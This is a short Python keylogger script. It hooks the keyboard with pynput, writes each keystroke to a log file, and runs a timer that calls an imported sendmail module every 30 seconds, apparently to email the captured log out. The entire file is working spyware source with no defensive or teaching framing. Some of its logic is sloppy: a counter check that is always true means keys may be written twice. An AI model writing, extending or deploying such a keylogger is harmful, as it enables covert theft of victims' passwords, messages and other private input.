from pynput.keyboard import Key,Listener
import threading
from email.message import EmailMessage
import sendmail

count = 0
keys = []

def on_press(key):
    global count,keys
    count += 1
    print("{0} pressed".format(key))
    keys.append(key)
    write_file(keys)
    if count >= 0:
        count = 0
        write_file(keys)
        keys = []

def write_file(keys):
    with open("log.txt" , "a" , encoding="utf-8") as file:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("backspace") > 0:
                file.write("<del>")
            if k.find("space") > 0:
                file.write(" ")
            elif k.find("enter") > 0:
                file.write("\n")
            elif k.find("Key") == -1:
                file.write(k)

def thread_function():
    sendmail.send_message()
    timer_object = threading.Timer(30,thread_function)
    timer_object.start()
    
with Listener(on_press = on_press) as listener:
    thread_function()
    listener.join()